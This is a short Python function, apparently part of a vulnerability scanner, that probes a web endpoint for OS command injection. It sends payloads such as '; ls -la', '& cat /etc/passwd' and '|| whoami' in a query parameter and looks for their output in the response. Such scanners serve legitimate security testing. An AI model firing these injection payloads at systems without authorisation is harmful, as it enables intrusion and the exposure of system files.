import requests
from .utils import create_result

def command_injection_test(base_url, options=None):
    """
    Tests for command injection by sending OS command separators.
    Returns logs, score, and success flag.
    """
    if options is None:
        options = {}
    
    result_logs = []
    payloads = [
        "; ls -la",
        "& cat /etc/passwd",
        "| dir",
        "|| whoami",
    ]
    
    endpoint = options.get("endpoint", "/execute")
    param_name = options.get("param_name", "cmd")
    
    overall_success = True
    for payload in payloads:
        url = f"{base_url.rstrip('/')}{endpoint}?{param_name}={payload}"
        try:
            response = requests.get(url, timeout=10)
            msg = f"[CmdInjection Test] Sent payload '{payload}' to {url} (Status: {response.status_code})"
            result_logs.append(msg)
            if "root:x" in response.text or "Directory of" in response.text:
                result_logs.append(f"Possible vulnerability detected with payload '{payload}'.")
        except Exception as e:
            overall_success = False
            result_logs.append(f"Error while testing command injection '{payload}': {str(e)}")
    
    return create_result(
        logs=result_logs,
        score=9,
        success=overall_success
    )
